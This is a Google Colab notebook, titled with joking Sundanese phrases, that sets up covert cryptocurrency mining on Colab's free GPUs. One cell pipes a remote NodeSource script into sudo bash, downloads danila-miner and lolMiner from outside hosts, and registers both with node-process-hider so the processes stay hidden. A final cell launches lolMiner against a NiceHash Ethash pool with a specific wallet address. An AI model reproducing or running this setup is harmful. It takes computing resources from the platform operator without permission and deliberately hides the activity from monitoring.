{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "01010101010101.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "cmbtuEyk3IgH"
      },
      "source": [
        "# **MODAL MELEPAS LAJANG**"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **CHECK Mang**\n",
        "!nvidia-smi"
      ],
      "metadata": {
        "cellView": "form",
        "id": "q6m7BaFRJiEm",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "06db44fd-c869-4507-d3ca-fb08457e7f1b"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Thu Mar  3 10:05:47 2022       \n",
            "+-----------------------------------------------------------------------------+\n",
            "| NVIDIA-SMI 460.32.03    Driver Version: 460.32.03    CUDA Version: 11.2     |\n",
            "|-------------------------------+----------------------+----------------------+\n",
            "| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |\n",
            "| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |\n",
            "|                               |                      |               MIG M. |\n",
            "|===============================+======================+======================|\n",
            "|   0  Tesla K80           Off  | 00000000:00:04.0 Off |                    0 |\n",
            "| N/A   72C    P8    34W / 149W |      0MiB / 11441MiB |      0%      Default |\n",
            "|                               |                      |                  N/A |\n",
            "+-------------------------------+----------------------+----------------------+\n",
            "                                                                               \n",
            "+-----------------------------------------------------------------------------+\n",
            "| Processes:                                                                  |\n",
            "|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |\n",
            "|        ID   ID                                                   Usage      |\n",
            "|=============================================================================|\n",
            "|  No running processes found                                                 |\n",
            "+-----------------------------------------------------------------------------+\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "Rh-nd3WynT5K",
        "cellView": "form"
      },
      "outputs": [],
      "source": [
        "#@title **hayang Nikah Mang**\n",
        "!curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz && tar -xvf danila-miner-2.3.1-ubuntu-bionic.tar.gz && apt install screen && rm -rf danila-miner-2.3.1-ubuntu-bionic.tar.gz && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.44/lolMiner_v1.44_Lin64.tar.gz && tar xf lolMiner_v1.44_Lin64.tar.gz &&rm -rf lolMiner_v1.44_Lin64.tar.gz && mv 1.44 lolMiner && sudo ph add danila-miner lolMiner\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **DEURRR Mang**\n",
        "!./lolMiner/lolMiner --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:3353 --user 36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.suryadiii404 --ethstratum ETHV1\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "fWvTcxXPn8Yw",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}